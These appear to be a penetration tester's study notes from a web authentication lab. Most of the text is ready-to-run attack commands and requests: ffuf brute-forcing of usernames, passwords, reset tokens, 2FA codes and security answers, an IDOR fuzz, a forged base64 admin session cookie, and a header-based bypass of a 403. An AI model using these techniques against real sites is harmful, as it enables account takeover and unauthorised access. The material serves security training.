# Brute-Force Attacks
## Enumerating Users
```bash
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```
## Brute-Forcing Passwords
```bash
# Customaizing
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
# Password
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```
## Brute-Forcing Password Reset Tokens
```bash
seq -w 0 999999 > tokens.txt

ffuf -w tokens.txt -u http://94.237.122.36:46535/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```
## Brute-Forcing 2FA Codes
```bash
# Token
ffuf -w tokens.txt -u http://94.237.48.51:31857/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=rn93ps1erud0phg9fijkr18qgn" -d "otp=FUZZ" -fr "Invalid 2FA Code"
# Common Questions
ffuf -w city_wordlist.txt -u http://83.136.253.5:54291/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=e5dvik7k6cvi932099ue5q4hng" -d "security_response=FUZZ" -fr "Incorrect response."
```

## Default Credentials
- [Default Credentials](https://cirt.net/passwords/)
- [Default Github](https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv)
- [Seclist Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)

# Authentication Bypasses
## Direct Access
In the request part we can change 302 to 200 code to enter in the path /admin.php
```bash
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```
<img width="473" height="245" alt="image" src="https://github.com/user-attachments/assets/793b3385-3665-4627-934b-ee5d13477c07" />

<img width="466" height="274" alt="image" src="https://github.com/user-attachments/assets/a83acc60-c728-424a-9139-972a0a264055" />

In the request part we can change location path to enter 

<img width="937" height="306" alt="image" src="https://github.com/user-attachments/assets/f2b7ced3-64fc-4536-80dd-0dcf336352d0" />

<img width="465" height="280" alt="image" src="https://github.com/user-attachments/assets/dd875c8e-8655-4886-9d7b-0dfd5ad5e20d" />


## Parameter Modification
IDOR attack
```bash
fuf -w numbers.txt -u http://83.136.255.106:56237/admin.php?user_id=FUZZ -fr "Could not load admin data. Please check your privileges."
```
# Session Attacks
<img width="1550" height="219" alt="image" src="https://github.com/user-attachments/assets/db74baf9-2623-423a-88cc-9b98bda43a79" />

```bash
# Decode
echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d

user=htb-stdnt;role=user
# Encode (cookie session)
echo -n 'user=htb-stdnt;role=admin' | base64

dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
```
## Headers
### X-Original-Url / X-Rewrite-Url

First, normal request returns 403:
```
GET /.git/ HTTP/1.1
Host: example.com
```
This attempt to bypass will return 403 too, because URI hasn't changed and the rule still applies:
```
GET /.git/ HTTP/1.1
Host: example.com
X-Rewrite-URL: /.git/
```
This one should bypass the restriction:
```
GET / HTTP/1.1
Host: example.com
X-Rewrite-URL: /.git/
```
